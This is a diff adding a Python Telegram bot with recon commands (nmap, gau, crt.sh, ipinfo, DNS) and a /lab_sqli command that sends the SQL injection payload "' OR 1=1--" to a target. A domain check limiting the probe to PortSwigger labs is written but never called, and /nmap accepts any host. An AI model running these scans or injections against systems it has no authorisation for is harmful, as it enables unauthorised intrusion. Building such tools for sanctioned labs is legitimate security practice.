@@ -1,0 +1,649 @@
+import os
+import re
+import ipaddress
+import asyncio
+import socket
+import requests
+import subprocess
+
+from dotenv import load_dotenv
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from urllib.parse import urlparse
+
+load_dotenv()
+TOKEN = os.getenv("TELEGRAM_TOKEN")
+
+
+# Valida domínio
+def dominio_valido(dominio):
+    return re.match(r"^[A-Za-z0-9.-]+\.[A-Za-z]{2,}$", dominio)
+
+
+# /start
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "Web Bot iniciado\n\n"
+        "Comandos disponíveis:\n\n"
+        "/nmap <host> - Scan de portas/serviços\n"
+        "/gau <domínio> - Busca URLs\n"
+        "/crt <domínio> - Busca subdomínios\n"
+        "/ipinfo <IP> - Informações sobre IP\n"
+        "/dns <domínio> - Resolve o domínio para endereços IP"
+	"/lab_sqli <domínio> - Analisa lab da Portswigger de SQL Injection"
+    )
+
+
+# /nmap
+async def nmap(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("❌ Use: /nmap <host>")
+        return
+
+    host = context.args[0]
+
+    await update.message.reply_text(
+        f"Executando scan em {host}..."
+    )
+
+    try:
+        processo = await asyncio.create_subprocess_exec(
+            "nmap", "-sV", "--top-ports", "20", host,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+
+        saida, erro = await processo.communicate()
+
+        if processo.returncode != 0:
+            await update.message.reply_text(
+                "❌ Host inválido ou inacessível."
+            )
+            return
+
+        resultado = saida.decode()
+        portas = []
+
+        for linha in resultado.splitlines():
+            if "/tcp" in linha and ("open" in linha or "filtered" in linha):
+                portas.append(linha)
+
+        if portas:
+            formatado = "\n".join(portas)
+
+            await update.message.reply_text(
+                f"Resultado do Nmap\n\n"
+                f"Host: {host}\n\n"
+                f"Portas e serviços:\n"
+                f"{formatado}"
+            )
+
+        else:
+            await update.message.reply_text(
+                f"Nenhuma porta aberta encontrada em {host}."
+            )
+
+    except Exception:
+        await update.message.reply_text(
+            "❌ Erro ao executar o Nmap."
+        )
+
+
+# /gau
+async def gau(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("❌ Use: /gau <domínio>")
+        return
+
+    dominio = context.args[0]
+
+    if not dominio_valido(dominio):
+        await update.message.reply_text("❌ Domínio inválido.")
+        return
+
+    await update.message.reply_text(
+        f"Buscando URLs de {dominio}..."
+    )
+
+    try:
+        processo = await asyncio.create_subprocess_exec(
+            "gau", dominio,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+
+        try:
+            saida, erro = await asyncio.wait_for(
+                processo.communicate(),
+                timeout=30
+            )
+
+        except asyncio.TimeoutError:
+            processo.kill()
+            saida, erro = await processo.communicate()
+
+        resultado = saida.decode().splitlines()
+
+        if not resultado:
+            await update.message.reply_text(
+                "Nenhuma URL encontrada ou as fontes externas "
+                "do GAU estão indisponíveis."
+            )
+            return
+
+        # Mostra no máximo 30 URLs
+        urls = resultado[:30]
+
+        mensagem = (
+            f"Resultado do GAU\n\n"
+            f"Domínio: {dominio}\n"
+            f"URLs encontradas: {len(resultado)}\n\n"
+            + "\n".join(urls)
+        )
+
+        if len(resultado) > 30:
+            mensagem += (
+                "\n\nExibindo apenas as primeiras 30 URLs."
+            )
+
+        await update.message.reply_text(
+            mensagem[:4000]
+        )
+
+    except FileNotFoundError:
+        await update.message.reply_text(
+            "❌ GAU não está instalado ou não foi encontrado no PATH."
+        )
+
+    except Exception as erro:
+        print("ERRO GAU:", erro)
+
+        await update.message.reply_text(
+            "❌ Erro ao executar o GAU."
+        )
+
+
+# /crt
+async def crt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("❌ Use: /crt <domínio>")
+        return
+
+    dominio = context.args[0]
+
+    if not dominio_valido(dominio):
+        await update.message.reply_text("❌ Domínio inválido.")
+        return
+
+    await update.message.reply_text(
+        f"Buscando subdomínios de {dominio}..."
+    )
+
+    try:
+        resposta = requests.get(
+            f"https://crt.sh/?q=%25.{dominio}&output=json",
+            timeout=60
+        )
+
+        # Verifica se a consulta ao crt.sh respondeu corretamente
+        if resposta.status_code != 200:
+            await update.message.reply_text(
+                f"❌ A consulta ao crt.sh apresentou um erro "
+                f"(HTTP {resposta.status_code})."
+            )
+            return
+
+        dados = resposta.json()
+        subdominios = set()
+
+        for item in dados:
+            for nome in item["name_value"].splitlines():
+                nome = nome.replace("*.", "").strip()
+
+                # Mantém apenas subdomínios e remove e-mails
+                if nome.endswith("." + dominio) and "@" not in nome:
+                    subdominios.add(nome)
+
+        if not subdominios:
+            await update.message.reply_text(
+                "Nenhum subdomínio encontrado."
+            )
+            return
+
+        resultado = "\n".join(sorted(subdominios))
+
+        await update.message.reply_text(
+            f"Subdomínios - {dominio}\n\n"
+            f"{resultado[:3800]}"
+        )
+
+    except requests.exceptions.Timeout:
+        await update.message.reply_text(
+            "❌ A consulta ao crt.sh demorou muito para responder."
+        )
+
+    except requests.exceptions.RequestException:
+        await update.message.reply_text(
+            "❌ Não foi possível realizar a consulta ao crt.sh."
+        )
+
+    except ValueError:
+        await update.message.reply_text(
+            "❌ O crt.sh retornou uma resposta inválida."
+        )
+
+    except Exception as erro:
+        print("ERRO CRT:", erro)
+
+        await update.message.reply_text(
+            "❌ Erro ao consultar o crt.sh."
+        )
+
+
+# /ipinfo
+async def ipinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("❌ Use: /ipinfo <IP>")
+        return
+
+    ip = context.args[0]
+
+    try:
+        ipaddress.ip_address(ip)
+
+    except ValueError:
+        await update.message.reply_text(
+            "❌ IP inválido."
+        )
+        return
+
+    try:
+        dados = requests.get(
+            f"https://ipinfo.io/{ip}/json",
+            timeout=10
+        ).json()
+
+        resultado = (
+            f"Informações do IP\n\n"
+            f"IP: {dados.get('ip', 'N/A')}\n"
+            f"Cidade: {dados.get('city', 'N/A')}\n"
+            f"Região: {dados.get('region', 'N/A')}\n"
+            f"País: {dados.get('country', 'N/A')}\n"
+            f"Organização: {dados.get('org', 'N/A')}"
+        )
+
+        await update.message.reply_text(
+            resultado
+        )
+
+    except Exception:
+        await update.message.reply_text(
+            "❌ Erro ao consultar o ipinfo.io."
+        )
+
+
+# /dns
+async def dns(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("❌ Use: /dns <domínio>")
+        return
+
+    dominio = context.args[0]
+
+    if not dominio_valido(dominio):
+        await update.message.reply_text(
+            "❌ Domínio inválido."
+        )
+        return
+
+    await update.message.reply_text(
+        f"Consultando DNS de {dominio}..."
+    )
+
+    try:
+        informacoes = socket.getaddrinfo(
+            dominio,
+            None
+        )
+
+        ips = set()
+
+        for info in informacoes:
+            ips.add(info[4][0])
+
+        if not ips:
+            await update.message.reply_text(
+                "Nenhum endereço IP encontrado."
+            )
+            return
+
+        resultado = "\n".join(sorted(ips))
+
+        await update.message.reply_text(
+            f"Resultado DNS\n\n"
+            f"Domínio: {dominio}\n\n"
+            f"Endereços IP:\n"
+            f"{resultado}"
+        )
+
+    except socket.gaierror:
+        await update.message.reply_text(
+            "❌ Não foi possível resolver esse domínio."
+        )
+
+    except Exception as erro:
+        print("ERRO DNS:", erro)
+
+        await update.message.reply_text(
+            "❌ Erro ao realizar a consulta DNS."
+        )
+
+#lab_sqli
+
+# validação do lab da port
+
+def validar_url_port_swigger(url):
+    try:
+        url = url.strip().strip("<>[]()")
+
+        parsed = urlparse(url)
+
+        print("URL recebida:", repr(url))
+        print("Scheme:", repr(parsed.scheme))
+        print("Hostname:", repr(parsed.hostname))
+
+        if parsed.scheme.lower() != "https":
+            return False
+
+        host = (parsed.hostname or "").lower().strip(".")
+
+        if host == "web-security-academy.net":
+            return True
+
+        if host.endswith(".web-security-academy.net"):
+            return True
+
+        return False
+
+    except Exception as erro:
+        print("Erro ao validar URL:", erro)
+        return False
+
+def executar_gau(target_url):
+    """
+    Executa o GAU usando somente o hostname do laboratório.
+    """
+
+    host = urlparse(target_url).hostname
+
+    if not host:
+        return []
+
+    try:
+        processo = subprocess.run(
+            ["gau", host],
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+
+        if processo.returncode != 0:
+            return []
+
+        urls = []
+
+        for linha in processo.stdout.splitlines():
+            linha = linha.strip()
+
+            if linha:
+                urls.append(linha)
+
+        return urls
+
+    except FileNotFoundError:
+        return []
+
+    except subprocess.TimeoutExpired:
+        return []
+
+    except Exception:
+        return []
+
+
+# teste basico de  sql injection
+
+def testar_sqli(target_url):
+    """
+    Teste destinado exclusivamente ao laboratório autorizado
+    da PortSwigger Web Security Academy.
+
+    SQL injection vulnerability in WHERE clause allowing
+    retrieval of hidden data.
+    """
+
+    payload = "' OR 1=1--"
+
+    try:
+
+        resposta_normal = requests.get(
+            target_url,
+            params={
+                "category": "Gifts"
+            },
+            timeout=10
+        )
+
+        resposta_teste = requests.get(
+            target_url,
+            params={
+                "category": payload
+            },
+            timeout=10
+        )
+
+        return {
+            "normal_status": resposta_normal.status_code,
+            "normal_size": len(resposta_normal.text),
+
+            "teste_status": resposta_teste.status_code,
+            "teste_size": len(resposta_teste.text),
+
+            "url_teste": resposta_teste.url
+        }
+
+    except requests.RequestException as erro:
+
+        return {
+            "erro": str(erro)
+        }
+
+
+
+# ANÁLISE DO LAB
+
+
+def analisar_lab(target_url):
+
+    resultado = {
+        "target": target_url,
+        "host": urlparse(target_url).hostname,
+        "gau": [],
+        "sqli": None
+    }
+    
+    # GAU
+    
+
+    resultado["gau"] = executar_gau(target_url)
+
+    
+    # SQL INJECTION
+    
+
+    resultado["sqli"] = testar_sqli(target_url)
+
+    return resultado
+
+
+# comando /lab_sqli
+
+
+async def lab_sqli(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+
+    # Verifica se foi enviada uma URL
+
+    if not context.args:
+
+        await update.message.reply_text(
+            "Uso correto:\n\n"
+            "/lab_sqli <URL>\n\n"
+            "Exemplo:\n"
+            "/lab_sqli https://SEU-LAB.web-security-academy.net/"
+        )
+
+        return
+
+    target_url = context.args[0].strip()
+
+    # Valida domínio
+
+    
+
+
+
+    # Início
+    
+    await update.message.reply_text(
+        "🔎 Lab SQLi recebido.\n\n"
+        f"Alvo:\n{target_url}\n\n"
+        "Iniciando análise..."
+    )
+
+    try:
+
+        # Evita bloquear o bot enquanto requests/GAU executam
+        resultado = await asyncio.to_thread(
+            analisar_lab,
+            target_url
+        )
+
+       
+        # resultado gau
+        
+
+        urls_gau = resultado["gau"]
+
+        if urls_gau:
+
+            # Evita mensagem enorme no Telegram
+            urls_exibidas = urls_gau[:10]
+
+            texto_gau = "\n".join(urls_exibidas)
+
+            await update.message.reply_text(
+                "🌐 URLs encontradas pelo GAU:\n\n"
+                f"{texto_gau}"
+            )
+
+        else:
+
+            await update.message.reply_text(
+                "🌐 GAU:\n"
+                "Nenhuma URL histórica encontrada."
+            )
+
+       
+        # resultado
+        
+
+        sqli = resultado["sqli"]
+
+        if "erro" in sqli:
+
+            await update.message.reply_text(
+                "❌ Erro durante o teste SQLi:\n\n"
+                f"{sqli['erro']}"
+            )
+
+            return
+
+        normal_status = sqli["normal_status"]
+        normal_size = sqli["normal_size"]
+
+        teste_status = sqli["teste_status"]
+        teste_size = sqli["teste_size"]
+
+        url_teste = sqli["url_teste"]
+
+        diferenca = teste_size - normal_size
+
+        mensagem = (
+            "🧪 Resultado do teste SQLi\n\n"
+
+            "REQUISIÇÃO NORMAL\n"
+            f"Status: {normal_status}\n"
+            f"Tamanho: {normal_size} bytes\n\n"
+
+            "REQUISIÇÃO DE TESTE\n"
+            f"Status: {teste_status}\n"
+            f"Tamanho: {teste_size} bytes\n\n"
+
+            f"Diferença: {diferenca} bytes\n\n"
+
+            "URL utilizada:\n"
+            f"{url_teste}"
+        )
+
+        await update.message.reply_text(mensagem)
+
+      
+        #analise
+        
+
+        if (
+            teste_status == 200
+            and teste_size > normal_size
+        ):
+
+            await update.message.reply_text(
+                "⚠️ O comportamento da resposta mudou após "
+                "o payload de teste.\n\n"
+                "Isso é compatível com o comportamento esperado "
+                "no laboratório SQL Injection da PortSwigger."
+            )
+
+        else:
+
+            await update.message.reply_text(
+                "ℹ️ Não foi identificada uma diferença clara "
+                "entre as respostas.\n\n"
+                "Verifique se o laboratório utilizado corresponde "
+                "ao exercício de SQL Injection esperado."
+            )
+
+    except Exception as erro:
+
+        await update.message.reply_text(
+            "❌ Ocorreu um erro durante a análise:\n\n"
+            f"{erro}"
+        )
+
+
+
+
+# Inicia o bot
+app = ApplicationBuilder().token(TOKEN).build()
+
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("nmap", nmap))
+app.add_handler(CommandHandler("gau", gau))
+app.add_handler(CommandHandler("crt", crt))
+app.add_handler(CommandHandler("ipinfo", ipinfo))
+app.add_handler(CommandHandler("dns", dns))
+app.add_handler(CommandHandler("lab_sqli", lab_sqli))
+
+print("Web Bot está rodando...")
+app.run_polling()
